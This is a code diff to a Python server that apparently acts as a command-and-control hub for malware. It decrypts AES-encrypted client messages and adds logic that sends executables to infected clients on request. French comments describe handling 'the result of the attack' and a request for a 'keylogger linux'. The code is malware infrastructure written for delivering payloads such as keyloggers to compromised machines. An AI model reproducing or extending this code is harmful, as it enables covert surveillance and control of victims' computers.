@@ -254,8 +254,25 @@ def start_server(port):
                 cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                 pt = unpad(cipher.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
 
+
+                # send_exec
                 print(client['addr'])
                 print("received data : " + str(pt))
+
+                client_message = json.loads(pt)
+
+                #{"request":"XXX"}
+
+                if "request" in client_message:
+                    # envoyer l'executable au client
+                    send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])
+
+                else :
+                    # interpreter le resultat de l'attaque
+                    print("a")
+
+
+                # REQUEST keylogger linux
 
             except Empty:
                 pass
